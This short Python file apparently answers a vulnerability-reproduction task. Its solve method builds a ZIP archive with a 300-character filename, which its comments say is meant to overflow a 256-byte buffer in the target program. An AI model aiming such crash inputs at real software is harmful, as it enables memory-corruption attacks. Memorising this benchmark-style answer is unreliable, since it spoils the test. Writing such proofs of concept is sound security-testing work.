import io
import zipfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create long filename that exceeds 256-byte buffer
        # 300 characters ensures overflow (more than 256)
        filename = "A" * 300
        
        # Create zip in memory
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_STORED) as zf:
            # Add file with long filename
            zf.writestr(filename, b"content")
        
        buffer.seek(0)
        return buffer.getvalue()